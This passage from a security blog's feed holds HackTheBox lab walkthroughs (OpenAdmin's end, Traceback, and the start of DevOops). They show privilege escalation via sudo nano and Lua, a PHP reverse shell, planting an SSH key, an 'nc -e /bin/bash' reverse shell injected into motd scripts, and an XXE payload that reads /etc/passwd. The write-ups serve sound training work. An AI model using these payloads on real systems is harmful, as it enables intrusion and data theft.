<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joanna@openadmin:~$ ls -la</span><br><span class="line">total 48</span><br><span class="line">drwxr-x--- 6 joanna joanna 4096 Feb  9 14:17 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Nov 22 18:00 ..</span><br><span class="line">-rw-rw-r-- 1 joanna joanna   64 Feb  9 14:02 0</span><br><span class="line">lrwxrwxrwx 1 joanna joanna    9 Nov 22 18:02 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 joanna joanna  220 Nov 22 18:00 .bash_logout</span><br><span class="line">-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrc</span><br><span class="line">drwx------ 2 joanna joanna 4096 Nov 22 22:42 .cache</span><br><span class="line">drwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupg</span><br><span class="line">drwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .<span class="built_in">local</span></span><br><span class="line">-rw------- 1 joanna joanna   86 Feb  9 14:17 nano.save</span><br><span class="line">-rw-r--r-- 1 joanna joanna  807 Nov 22 18:00 .profile</span><br><span class="line">drwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh</span><br><span class="line">-rw-rw-r-- 1 joanna joanna   33 Nov 28 09:37 user.txt</span><br><span class="line">joanna@openadmin:~$ cat user.txt</span><br><span class="line">c9b2c[--------------]f0c81b5f</span><br></pre></td></tr></table></figure>
<p><code>sudo -l</code>命令显示用户Joanna能够以root用户身份运行<code>/bin/nano /opt/priv</code>，而无需输入密码。 当看到用户可以以root用户身份运行nano时，这是最简单的利用方法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joanna@openadmin:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br></pre></td></tr></table></figure>
<p>就可以得到/root/root.txt文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209224305.png" alt=""></p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<p><a href="https://decdeg.com/hackthebox-open-admin-10-10-10-171/">https://decdeg.com/hackthebox-open-admin-10-10-10-171/</a></p>
<p><a href="https://www.jianshu.com/p/9f1f9145ac3f">https://www.jianshu.com/p/9f1f9145ac3f</a></p>
<p><a href="https://xz.aliyun.com/t/3958#toc-1">https://xz.aliyun.com/t/3958#toc-1</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Traceback Walkthrough</title>
    <url>/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Traceback-Walkthrough">HTB::Traceback Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324162401.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>pspy</li>
<li>gtfobins</li>
<li>OSINT</li>
<li>SSH with public key</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Mon Mar 23 10:20:21 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.181</span><br><span class="line">Nmap scan report for 10.10.10.181</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)</span><br><span class="line">|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)</span><br><span class="line">|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Help us</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Mon Mar 23 10:21:10 2020 -- 1 IP address (1 host up) scanned in 49.24 seconds</span><br></pre></td></tr></table></figure>
<p>Meanwhile, I ran <code>gobuster</code> and <code>dirb</code> But there is anything interesting for me.</p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>80 HTTP Website</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324173714.png" alt=""></p>
<p>Hint：<code>Some of the best web shells that you might need ;)</code>， Google it</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324192528.png" style="zoom:67%;" />
<p>Found a Github repo</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324192614.png" style="zoom:80%;" />
<p>Test all webshell filename for url</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324192715.png" style="zoom:80%;" />
<p><code>smevk.php</code> webshell works, and username is admin, password is admin.</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324194144.png" alt=""></p>
<p>Upload <a href="https://github.com/pentestmonkey/php-reverse-shell">php reverse shell script</a> through Code Injector module.</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324194928.png" alt=""></p>
<p>Now I can get a php reverse shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200324195537.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">10.10.10.181: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.99] from (UNKNOWN) [10.10.10.181] 33430</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(webadmin) gid&#x3D;1000(webadmin) groups&#x3D;1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">$ cd &#x2F;home&#x2F;webadmin</span><br><span class="line">$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..</span><br><span class="line">-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc</span><br><span class="line">drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache</span><br><span class="line">drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local</span><br><span class="line">-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history</span><br><span class="line">-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile</span><br><span class="line">drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh</span><br><span class="line">-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt</span><br></pre></td></tr></table></figure>
<p>在webadmin的主目录主要看两个文件<code>note.txt</code>和<code>.bash_history</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat note.txt</span><br><span class="line">- sysadmin -</span><br><span class="line">I have left a tool to practice Lua.</span><br><span class="line">I&#39;m sure you know where to find it.</span><br><span class="line">Contact me if you have any question.</span><br><span class="line">$ cat .bash_history</span><br><span class="line">ls -la</span><br><span class="line">sudo -l</span><br><span class="line">nano privesc.lua</span><br><span class="line">sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua </span><br><span class="line">rm privesc.lua</span><br><span class="line">logout</span><br></pre></td></tr></table></figure>
<p>应该是利用<code>/home/sysadmin/luvit</code>这个工具执行lua脚本，可以再新建一个<code>privesc.lua</code>脚本，然后模仿<code>.bash_history</code>执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; privesc.lua</span><br><span class="line">$ cat privesc.lua</span><br><span class="line">os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">$sudo -u sysadmin &#x2F;home&#x2F;sysadmin&#x2F;luvit privesc.lua</span><br><span class="line">sh: turning off NDELAY mode</span><br><span class="line"></span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1001(sysadmin) gid&#x3D;1001(sysadmin) groups&#x3D;1001(sysadmin)</span><br><span class="line">cd &#x2F;home&#x2F;sysadmin </span><br><span class="line">ls</span><br><span class="line">luvit</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>Get user flag~</p>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>看了一下HTB Forum上面一些师傅给的提示，用pspy工具监视系统中在执行的程序，发现了一个有意思的地方：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2273   | sleep 30 </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2272   | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2271   | </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2270   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:01 CMD: UID&#x3D;0    PID&#x3D;2269   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2020&#x2F;03&#x2F;23 21:11:31 CMD: UID&#x3D;0    PID&#x3D;2275   | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm</span><br><span class="line"> &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F; </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2281   | sleep 30 </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2278   | &#x2F;bin&#x2F;sh -c sleep 30 ; &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;* &#x2F;etc&#x2F;update-motd.d&#x2F; </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2277   | </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:02 CMD: UID&#x3D;0    PID&#x3D;2276   | &#x2F;usr&#x2F;sbin&#x2F;CRON -f </span><br><span class="line">2020&#x2F;03&#x2F;23 21:12:32 CMD: UID&#x3D;0    PID&#x3D;2282   | &#x2F;bin&#x2F;cp &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;00-header &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;10-help-text &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;50-motd-news &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;80-esm</span><br><span class="line"> &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F;91-release-upgrade &#x2F;etc&#x2F;update-motd.d&#x2F;</span><br></pre></td></tr></table></figure>
<p>可以看到系统每隔30秒就把<code>/var/backups/.update-motd.d/</code>中的文件都复制到<code>/etc/update-motd.d/</code>，Google一下<code>update-motd.d</code>的作用，发现是每次SSH登录成功后，会执行<code>00-header</code>文件中的命令。现在的问题就是怎么用SSH登录靶机，我找了很久SSH的登录密码，后来才突然想到SSH除了口令登录还可以公钥登录，把本机上的公钥拷贝到靶机的<code>/home/webadmin/.ssh/authorized_keys</code>文件中即可。</p>
<blockquote>
<p>顺便把SSH的原理复习一下：<a href="https://www.jianshu.com/p/33461b619d53">https://www.jianshu.com/p/33461b619d53</a></p>
</blockquote>
<p>靶机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6zGx1XQHjBj5x5D+qqE+0wml2VnALfbz7D5CpexgNrpEDQTOWCEkIAl1Ftt9FNClzdNk+&#x2F;NFMWXR8dxRHzOl7aQzMa+njQOzh6VyM34YbCGuGgakDCIrsHu25dAwypvJ7Clp22faDDIw6zJxcx84Ir1XSpUeWZ4Cotk+0gVzwg</span><br><span class="line">LHbstRPxyzxROvcsesx9kd251L3&#x2F;bWJzC53oNDaSXzMBYV7sdjSlPLeD9zHJ39wr5YaEFwn0vkgPR+VAdlXAOLi98Ttr+FYMsGr8XMbJU06QKZ2ozf6RVjc6RJ5hjgIFbcxV8VCNGM6rBx5FDCZDgnbzu4ITWpWsgBBLu3JndjD+UWkeejLE4K7eR3510W&#x2F;x4zHF&#x2F;0TsZicyh&#x2F;ZJb</span><br><span class="line">ZEo+JefvVKT0WAilaJ2K7w7jDkrPhZO6TheGTDnvLqrEvHObGq70ytpZ6ippsm78&#x2F;xkwCHu4l03RMd2Zt+7elXOsA&#x2F;4WsjEvS+CxqlbtTC636+T6T4cTro2GHlO3lAq7oddq0&#x3D; kali@kali &gt;&gt; &#x2F;home&#x2F;webadmin&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">$ cd &#x2F;etc&#x2F;update-motd.d&#x2F;</span><br><span class="line">$ echo &quot;cat &#x2F;root&#x2F;root.txt&quot; &gt;&gt; 00-header</span><br></pre></td></tr></table></figure>
<p>主机（这两个步骤衔接要快）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -i id_rsa webadmin@10.10.10.181</span><br><span class="line">#################################</span><br><span class="line">-------- OWNED BY XH4H  ---------</span><br><span class="line">- I guess stuff could have been configured better ^^ -</span><br><span class="line">#################################</span><br><span class="line">Welcome to Xh4H land</span><br><span class="line"></span><br><span class="line">cf6c[---------------------------]aefc</span><br><span class="line"></span><br><span class="line">Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2</span><br></pre></td></tr></table></figure>
<p>Get root flag~</p>
<p>另外，还可以在<code>91-release-upgrade</code>写一个reverse shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;tmp&#x2F;nc -e &#x2F;bin&#x2F;bash 10.10.14.194 2345</span><br><span class="line"># if the current release is under development there won&#39;t be a new one</span><br><span class="line">if [ &quot;$(lsb_release -sd | cut -d&#39; &#39; -f4)&quot; &#x3D; &quot;(development&quot; ]; then</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line">if [ -x &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motd ]; then</span><br><span class="line">    exec &#x2F;usr&#x2F;lib&#x2F;ubuntu-release-upgrader&#x2F;release-upgrade-motd</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Conclusion">0x04 Conclusion</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/Traceback.png" alt=""></p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/">https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/</a></p>
<p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
<p><a href="https://gtfobins.github.io/gtfobins/lua/">https://gtfobins.github.io/gtfobins/lua/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::DevOops Walkthrough</title>
    <url>/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-DevOops-Walkthrough">HTB::DevOops Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200329123807.png" alt=""></p>
<h2 id="0x02-Preliminary">0x02 Preliminary</h2>
<h3 id="Python-unserialize">Python unserialize</h3>
<p><a href="https://r1dd1er.top/2019/05/21/python%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://r1dd1er.top/2019/05/21/python安全之反序列化/</a></p>
<p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/关于Python-sec的一些总结/</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p>
<p><a href="http://www.code2sec.com/python-picklede-ren-yi-dai-ma-zhi-xing-lou-dong-shi-jian-he-payloadgou-zao.html">http://www.code2sec.com/python-picklede-ren-yi-dai-ma-zhi-xing-lou-dong-shi-jian-he-payloadgou-zao.html</a></p>
<p>靶场：<a href="https://github.com/vulhub/vulhub/tree/master/python/unpickle">https://github.com/vulhub/vulhub/tree/master/python/unpickle</a></p>
<h3 id="XXE-Injection">XXE Injection</h3>
<p><a href="https://ca0y1h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/20.xxe漏洞利用/</a></p>
<h2 id="0x03-Tools-and-Tips">0x03 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>dirsearch</li>
<li>wfuzz</li>
<li>Python pickle unserialize</li>
<li>XXE read files</li>
<li>Git</li>
</ul>
<h2 id="0x04-Pentesting">0x04 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap scan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Tue Mar 24 09:04:48 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.91</span><br><span class="line">Nmap scan report for 10.10.10.91</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)</span><br><span class="line">|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)</span><br><span class="line">|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)</span><br><span class="line">5000&#x2F;tcp open  http    Gunicorn 19.7.1</span><br><span class="line">|_http-server-header: gunicorn&#x2F;19.7.1</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Tue Mar 24 09:05:52 2020 -- 1 IP address (1 host up) scanned in 64.19 seconds</span><br></pre></td></tr></table></figure>
<p>5000 port run as Python web server <a href="https://gunicorn.org/">gunicorn</a>，dirsearch and wfuzz scan directory</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;dirsearch -u http:&#x2F;&#x2F;10.10.10.91:5000&#x2F; -e *</span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;</span><br><span class="line"></span><br><span class="line">[02:21:18] Starting: </span><br><span class="line">[02:24:47] 200 -  533KB - &#x2F;feed</span><br><span class="line">[02:27:26] 200 -  347B  - &#x2F;upload</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wfuzz --hc&#x3D;404 -z file,&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;FUZZ</span><br><span class="line">...</span><br><span class="line">000000126:   200        1815 L   24122    517022 Ch   &quot;feed&quot;</span><br><span class="line">000000366:   200        0 L      39 W     347 Ch      &quot;upload&quot;</span><br><span class="line">000019602:   405        4 L      23 W     178 Ch      &quot;newpost&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Flag">Getting User Flag</h3>
<p>visit the homepage</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Under construction!<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      This is feed.py, which will become the MVP for Blogfeeder application.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      TODO: replace this with the proper feed from the dev.solita.fi backend.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/feed&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">width</span>=<span class="string">&quot;60%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;60%&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>visit <code>http://10.10.10.91:5000/upload</code>, it should upload xml file including Author, Subject, Content elements. Try to upload a normal xml file.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Author</span>&gt;</span>author<span class="tag">&lt;/<span class="name">Author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Subject</span>&gt;</span>subject<span class="tag">&lt;/<span class="name">Subject</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Content</span>&gt;</span>content<span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>return a comfirmation and file path.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROCESSED BLOGPOST: Author: author Subject: subject Content: content URL for later reference: &#x2F;uploads&#x2F;test.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src</span><br></pre></td></tr></table></figure>
<p>now, I try to upload an evil xml file that can read files</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Author</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Author</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Subject</span>&gt;</span>ca01h<span class="tag">&lt;/<span class="name">Subject</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Content</span>&gt;</span>njupt<span class="tag">&lt;/<span class="name">Content</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;file;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Author</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Visit <code>http://10.10.10.91:5000/uploads/evil.xml</code>, success to return <code>/etc/passwd</code> file.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROCESSED BLOGPOST: Author: njupt root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">......</span><br><span class="line">roosa:x:1002:1002:,,,:&#x2F;home&#x2F;roosa:&#x2F;bin&#x2F;bash sshd:x:121:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin blogfeed:x:1003:1003:,,,:&#x2F;home&#x2F;blogfeed:&#x2F;bin&#x2F;false Subject: ca01h Content: njupt URL for later reference: &#x2F;uploads&#x2F;evil.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src</span><br></pre></td></tr></table></figure>
<p>结合首页的<code>feed.py</code>提示，以及上传成功后的信息<code>/home/roosa/deploy/src</code>，猜测网站的源码应该是放在这个目录，然后我们尝试访问<code>/home/roosa/deploy/src/feed.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def uploaded_file(filename):</span><br><span class="line">	return send_from_directory(Config.UPLOAD_FOLDER, filename) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;) </span><br><span class="line">def xss(): </span><br><span class="line">	return template(&#39;index.html&#39;) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;feed&quot;) </span><br><span class="line">def fakefeed(): </span><br><span class="line">	return send_from_directory(&quot;.&quot;,&quot;devsolita-snapshot.png&quot;) </span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;newpost&quot;, methods&#x3D;[&quot;POST&quot;]) </span><br><span class="line">def newpost():</span><br><span class="line">	# TODO: proper save to database, this is for testing purposes right now </span><br><span class="line">	picklestr &#x3D; base64.urlsafe_b64decode(request.data) </span><br><span class="line">	# return picklestr</span><br><span class="line">	postObj &#x3D; pickle.loads(picklestr) </span><br><span class="line">	return &quot;POST RECEIVED: &quot; + postObj[&#39;Subject&#39;] </span><br><span class="line"></span><br><span class="line">## TODO: VERY important! DISABLED THIS IN PRODUCTION </span><br><span class="line">#app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) </span><br><span class="line"># TODO: Replace run-gunicorn.sh with real Linux service script </span><br><span class="line">#app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) </span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;: </span><br><span class="line">	app.run(host&#x3D;&#39;0.0.0,0&#39;, Debug&#x3D;True)</span><br></pre></td></tr></table></figure>
<p>有了前面Python反序列化的基础，就很容易看出来<code>postObj = pickle.loads(picklestr) </code>这条语句存在反序列化漏洞。写一个Python脚本反弹shell：</p>
